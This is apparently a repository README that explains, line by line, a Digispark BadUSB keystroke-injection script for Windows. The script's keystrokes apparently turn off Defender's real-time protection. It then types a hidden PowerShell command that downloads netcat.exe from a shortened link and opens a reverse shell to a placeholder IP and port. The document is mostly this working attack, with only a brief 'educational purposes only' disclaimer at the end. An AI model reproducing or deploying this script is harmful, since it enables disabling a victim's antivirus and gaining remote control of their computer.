<h1><div align="center"><i>Script Breakdown</i></div></h1>

<code>#include "DigiKeyboard.h"</code>   This line includes the DigiKeyboard library.

<code>void setup() {}</code>          This line starts the setup function.

<code>DigiKeyboard.delay(1000);</code>       This line pauses the script for 1 second.

<code>DigiKeyboard.sendKeyStroke(KEY_S,MOD_GUI_LEFT);</code>  This line sends a key press for the S key with the left GUI (Windows) key modifier.

<code>DigiKeyboard.delay(1000);</code>  This line pauses the script for 1 second.

<code>DigiKeyboard.print("virus & threat protection");</code>   This line inputs the text "virus & threat protection".

<code>DigiKeyboard.delay(500);</code>   This line pauses the script for 0.5 seconds.

<code>DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>    This line sends a key press for the Enter key.

<code>DigiKeyboard.delay(5000);</code>    This line pauses the script for 5 seconds.

<code>DigiKeyboard.sendKeyStroke(43);</code>
<code>DigiKeyboard.sendKeyStroke(43);</code>    These four lines send key presses for the + key four times, which opens the settings menu in Windows 10.
<code>DigiKeyboard.sendKeyStroke(43);</code>
<code>DigiKeyboard.sendKeyStroke(43);</code>

<code>DigiKeyboard.delay(700);</code>   This line pauses the script for 0.7 seconds.

<code>DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>  This line sends a key press for the Enter key.

<code>DigiKeyboard.delay(700);</code>   This line pauses the script for 0.7 seconds.

<code>DigiKeyboard.sendKeyStroke(KEY_SPACE);</code>   This line sends a key press for the Space key.

<code>DigiKeyboard.delay(2000);</code>    This line pauses the script for 2 seconds.

<code>DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);</code>   This line sends a key press for the Y key with the left Alt key modifier.

<code>DigiKeyboard.delay(1000);</code>   This line pauses the script for 1 second.

<code>DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);</code>  This line sends a key press for the F4 key with the left Alt key modifier, which closes the current window.

<code>DigiKeyboard.delay(500);</code>     This line pauses the script for 0.5 seconds.

<code>DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);</code>   This line sends a key press for the R key with the left GUI (Windows) key modifier, which opens the Run dialog box.

<code>DigiKeyboard.delay(700);</code>  This line pauses the script for 0.7 seconds.

<code>DigiKeyboard.print("powershell curl -o netcat.exe https://bit.ly/3G3R1d1 ; powershell -w hidden netcat.exe &lt;ip&gt; &lt;port&gt; -e powershell.exe");</code>  This line inputs a PowerShell command that downloads and executes the netcat.exe tool, which can be used for remote command execution.

<code>DigiKeyboard.sendKeyStroke(KEY_ENTER);</code>  This line sends a key press for the Enter key, which executes the PowerShell command.
 
<code>void loop() {}</code> This line starts the loop function, which is empty in this script. The loop function is not used in this script.

<h2><div align="center"><i>Warning</i></div></h2>
<em>Everything in this repository is intended for educational purposes only. I am not responsible for any wrong behavior on your part. You are responsible for your actions using the script.</em>
